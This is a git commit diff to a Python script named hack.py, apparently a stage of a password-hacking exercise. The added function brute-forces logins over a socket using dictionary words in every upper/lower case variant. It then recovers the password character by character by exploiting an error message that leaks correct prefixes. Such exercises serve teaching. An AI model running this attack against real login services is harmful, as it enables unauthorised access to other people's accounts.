9dbf18175331567f966588488e401cf8e7502324
Rutzno <d.rutzno@gmail.com>
2022-09-06 11:51:50 +0000

    stage 4

--- hacking/hack.py
+++ hacking/hack.py
@@ -5,7 +5,7 @@ import socket
 """
 __author__ = "Mack_TB"
 __since__ = "28/8/2021"
-__version__ = "1.0.3"
+__version__ = "1.0.4"
 """
 
 
@@ -46,6 +46,48 @@ def bruteforce_with_dict(cl_socket, f):
             if response == "Connection success!":
                 print(password)
                 return
+
+
+def bruteforcelp_with_dict(cl_socket, f):
+    for word in f:
+        password = word.rstrip("\n")
+        chars = [[c] if c.isdigit() else [c, c.upper()] for c in password]
+        for tup in itertools.product(*chars):  # test with different cases
+            login = "".join(tup)
+            credentials = set_credentials(login, "")
+            json_str = json.dumps(credentials)
+            cl_socket.send(json_str.encode())  # sending through socket
+
+            response = cl_socket.recv(1024)  # receiving the response
+            response = response.decode()  # decoding from bytes to string
+            response = json.loads(response)
+            if response["result"] == "Wrong password!":
+                chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+                i = 0
+                tmp = ""
+                password = ""
+                while i < len(chars):
+                    for c in [chars[i], chars[i].upper()]:
+                        tmp += c
+                        credentials = set_credentials(login, tmp)
+                        json_str = json.dumps(credentials)
+                        cl_socket.send(json_str.encode())  # sending through socket
+
+                        response = cl_socket.recv(1024)  # receiving the response
+                        response = response.decode()  # decoding from bytes to string
+                        response = json.loads(response)
+                        # print(response)
+                        if response["result"] == "Wrong password!":
+                            tmp = password
+                        elif response["result"] == "Exception happened during login":
+                            password = tmp
+                            # print(password)
+                            i = 0
+                        elif response["result"] == "Connection success!":
+                            print(json_str)
+                            return
+                    i += 1
+    # return None
 
 
 if __name__ == "__main__":
